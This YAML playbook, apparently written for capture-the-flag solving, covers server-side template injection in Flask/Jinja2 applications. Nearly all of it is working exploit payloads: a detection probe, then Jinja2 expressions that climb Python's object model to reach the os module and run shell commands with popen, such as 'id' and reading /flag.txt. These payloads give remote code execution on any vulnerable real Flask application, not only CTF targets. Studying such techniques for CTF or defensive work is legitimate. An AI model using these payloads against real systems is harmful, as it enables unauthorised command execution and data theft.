name: flask_jinja2_ssti
category: web
tags: [ssti, flask, jinja2, python, template_injection]
indicators:
  - "Flask Template() with user input"
  - "render_template_string() or Template() constructor"
  - "User input directly in template string"
  - "No sanitization of template variables"

tricks:
  - name: "Step 1: Identify SSTI"
    when: "Found user input in template rendering"
    how: "Test with Jinja2 expression"
    payload: |
      {{ 7*7 }}
      # If returns "49", SSTI confirmed

  - name: "Step 2: Access Python builtins"
    when: "SSTI confirmed in Flask/Jinja2"
    how: "Use class hierarchy to access os module"
    payload: |
      # Access config object
      {{ config.__class__.__init__.__globals__['os'].popen('id').read() }}

      # Or through subclasses
      {{ ''.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__['sys'].modules['os'].popen('id').read() }}

  - name: "Step 3: Read flag file"
    when: "RCE confirmed"
    how: "Execute command to read flag"
    payload: |
      {{ config.__class__.__init__.__globals__['os'].popen('cat /flag.txt').read() }}
      {{ config.__class__.__init__.__globals__['os'].popen('cat /FLAG.php').read() }}

  - name: "Alternative: Access request object"
    when: "config not available"
    how: "Use request object's globals"
    payload: |
      {{ request.__class__._load_form_data.__globals__['os'].popen('cat /flag.txt').read() }}
      {{ request.application.__globals__['os'].popen('cat /flag.txt').read() }}
